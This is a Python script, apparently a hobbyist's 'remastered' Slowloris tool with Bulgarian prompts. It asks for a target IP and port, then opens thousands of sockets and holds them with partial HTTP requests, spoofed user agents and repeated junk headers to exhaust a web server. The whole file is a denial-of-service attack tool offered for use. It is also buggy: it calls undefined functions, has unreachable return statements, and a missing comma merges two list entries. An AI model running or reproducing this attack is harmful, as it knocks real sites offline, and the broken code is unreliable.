import argparse
import logging
import random
import socket
import sys
import time


list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 CK= (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 YaBrowser/18.3.1.1232 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.840 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.840 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 YaBrowser/17.1.0.2034 Yowser/2.5 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.1.840 Yowser/2.5 Safari/537.36",
    "ABACHOBot/12.19 (Musix GNU Linux 3.3; no;)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320 ios/1.0.4.4",
    "PalmCentro/v0001 Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/Palm-D061; Blazer/4.5) 16;320x320 UP.Link/6.3.0.0.0",
    "Blazer/4.5 (PalmOS 5.4) NetFront/3.1a"
]
#ITS BULGARIAN VERSION! I WILL PUT IN LINK BELOW ENGLISH + BULGARIAN   [SLOWLORIS MADE BY ME]
port = (int(input("Molq vuvedete port: ")))
if port == 80:
    print("Portut {} e priet".format(port))
else:
    print("Portut {} e priet, no ochakvaite nai-veroqtno greshki..".format(port))

def init_run(ip):
    socket_count = random.randint(9000,1200000)
    socket_count2 = random.randint(9000, 120000)
    socket_count3 = random.randint(9000,120000)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    g = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    j = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    k = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    l = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    g.settimeout(4)
    h.settimeout(4)
    j.settimeout(4)
    k.settimeout(4)
    l.settimeout(4)
    s.connect((ip, port))
    g.connect((ip, port))
    h.connect((ip, port))
    j.connect((ip, port))
    k.connect((ip, port))
    l.connect((ip, port))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    g = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    g.settimeout(4)
    g.connect((ip, port))
    if user_agents:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
        g.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
        j.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
        k.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
        l.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
        g.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
        j.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
        k.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
        l.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    g.send("{}\r\n".format("Accept-langauge: en-US,en,q=0.5").encode("utf-8"))
    j.send("{}\r\n".format('Accept-language: en-US,en,q=0.5').encode("utf-8"))
    k.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    l.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s
    return g
    return j
    return k
    return l 


def main():
    socket_count = 9999
    karl = input("Molq vi vuvedete ip: ")
    ip = karl
    logging.info("Atakuvane na  %s s %s soketi.", ip)
    print("Atakuvane na %s s %s soketi", ip)

    logging.info("Suzdavane na soketi...")
    print("Suzdavane na soketi!")

    for _ in range(socket_count):
        try:
            logging.debug("Suzdavane na soketi nr %s", _)
            print("Suzdavane na soketi")
            s = init_run(ip)
            g = init_run(ip)
            j = init_run(ip)
            k = init_run(ip)
            l = init_run(ip)
        except KeyboardInterrupt:
            print("Izkluchvane....!")
            dox()
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            logging.info(
                "Izprashtane na Alive-headers... Socket count: %s", len(list_of_sockets)
            )
            print("Izprashtane na Alive headers...")
            for s in list(list_of_sockets):
                try:
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(s)
            for g in list(list_of_sockets):
                try:
                    g.send(
                        "X-a: {}\r\n".format(random_randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(g)
            for j in list(list_of_sockets):
                try:
                    j.send(
                        "X-a: {}\r\n".format(random_randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(j)
            for k in list(list_of_sockets):
                try:
                    k.send(
                        "X-a: {}\r\n".format(random_randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(k)
            for l in list(list_of_sockets):
                try:
                    l.send(
                        "X-a: {}\r\n".format(random_randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(l)
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Presuzdavane na soketi...")
                print("Presuzdavane na soketi")
                try:
                    s = init_run(ip)
                    if s:
                        list_of_sockets.append(s)
                    g = init_run(ip)
                    if g:
                        list_of_sockets.append(g)
                    j = init_run(ip)
                    if j:
                        list_of_sockets.append(j)
                    k = init_run(ip)
                    if k:
                        list_of_sockets.append(k)
                    l = init_run(ip)
                    if l:
                        list_of_sockets.append(l)
                except socket.error as e:
                    logging.debug(e)
                    break
            for g in list(list_of_sockets):
                try:
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 500000)).encode("utf-8")
                        )
                except socket.error:
                    list_of_sockets.remove(g)
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Presuzdavane na  soketi...")
                print("Presuzdavane na soketi!")
                try:
                    g = init_run(ip)
                    if g:
                        list_of_sockets.append(g)
                except socket.error as h:
                    logging.debug(h)
                    break
            socket_count2 = random.randint(9000, 120000)
            for _2 in range(socket_count2 - len(list_of_sockets)):
                logging.debug("Presuzdavane na soketi...")
                print("Presuzdavane na soketi")
                try:
                    g = init_run(ip)
                    if g:
                        list_of_sockets.append(g)
                    s = init_run(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as j:
                    logging.debug(j)
                    break
        except (KeyboardInterrupt, SystemExit):
            logging.info("Spirane na  Slowloris[REMASTARED]")
            break


if __name__ == "__main__":
    main()